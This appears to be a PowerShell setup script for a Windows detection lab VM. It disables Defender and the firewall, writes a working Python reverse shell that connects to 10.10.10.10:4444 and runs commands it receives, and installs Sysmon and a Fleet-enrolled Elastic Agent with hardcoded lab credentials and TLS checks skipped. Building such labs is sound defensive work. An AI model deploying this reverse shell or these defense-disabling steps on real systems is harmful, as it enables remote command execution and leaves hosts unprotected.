# Disable Windows Defender and Firewall

Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope LocalMachine
Set-MpPreference -DisableRealtimeMonitoring $true

# Configure network

cmd /c "route add 10.10.10.0 mask 255.255.255.0 10.10.1.1 -p"
netsh advfirewall set allprofiles state off

# Create a lab directory and write a reverse shell script

mkdir C:\Users\vagrant\lab
[System.IO.File]::WriteAllText("C:\Users\vagrant\lab\reverse.py", "import socket, subprocess`n`ns = socket.socket()`ns.connect(('10.10.10.10', 4444))`nwhile True:`n    cmd = s.recv(1024).decode().strip()`n    if not cmd:`n        break`n    output = subprocess.run(cmd, shell=True, capture_output=True)`n    s.send(output.stdout + output.stderr)`n")

(New-Object Net.WebClient).DownloadFile("https://www.python.org/ftp/python/3.12.7/python-3.12.7-embed-amd64.zip", "C:\Users\vagrant\lab\py.zip")
Remove-Item C:\Users\vagrant\lab\pyembed -Recurse -Force -ErrorAction SilentlyContinue; Expand-Archive C:\Users\vagrant\lab\py.zip -DestinationPath C:\Users\vagrant\lab\pyembed;

# Install Sysmon

(New-Object Net.WebClient).DownloadFile("https://download.sysinternals.com/files/Sysmon.zip", "C:\Sysmon.zip")
Add-Type -AssemblyName System.IO.Compression.FileSystem
[System.IO.Compression.ZipFile]::ExtractToDirectory('C:\Sysmon.zip', 'C:\Sysmon\')
& "C:\Sysmon\Sysmon64.exe" -accepteula -i C:\sysmon-config.xml

# Install Elastic Agent (Fleet-enrolled with Elastic Defend)

$ErrorActionPreference = "Stop"

(New-Object Net.WebClient).DownloadFile("https://artifacts.elastic.co/downloads/beats/elastic-agent/elastic-agent-9.4.2-windows-x86_64.zip", "C:\elastic-agent-9.4.2-windows-x86_64.zip")
[System.IO.Compression.ZipFile]::ExtractToDirectory('C:\elastic-agent-9.4.2-windows-x86_64.zip', 'C:\elastic-agent-tmp\')

# Wait for Fleet Server TCP port before attempting enrollment
Write-Host "Waiting for Fleet Server..."
while (-not (Test-NetConnection -ComputerName 10.10.1.1 -Port 8220 -WarningAction SilentlyContinue).TcpTestSucceeded) { Start-Sleep 5 }

# Fetch enrollment token for the "Windows Endpoints" policy specifically
# Filters by policy name to avoid picking the Fleet Server token by mistake
$headers = @{
    "kbn-xsrf" = "true"
    "Authorization" = "Basic " + [Convert]::ToBase64String([Text.Encoding]::ASCII.GetBytes("elastic:vagrant"))
}
$policyId = ((Invoke-RestMethod "http://10.10.1.1:5601/api/fleet/agent_policies" -Headers $headers).items |
    Where-Object { $_.name -eq "Windows Endpoints" }).id
$token = (Invoke-RestMethod "http://10.10.1.1:5601/api/fleet/enrollment_api_keys?policy_id=$policyId" -Headers $headers).items[0].api_key

# --insecure : accepts Fleet Server self-signed certificate (lab only)
& "C:\elastic-agent-tmp\elastic-agent-9.4.2-windows-x86_64\elastic-agent.exe" install `
  --url=https://10.10.1.1:8220 `
  --enrollment-token=$token `
  --insecure --non-interactive
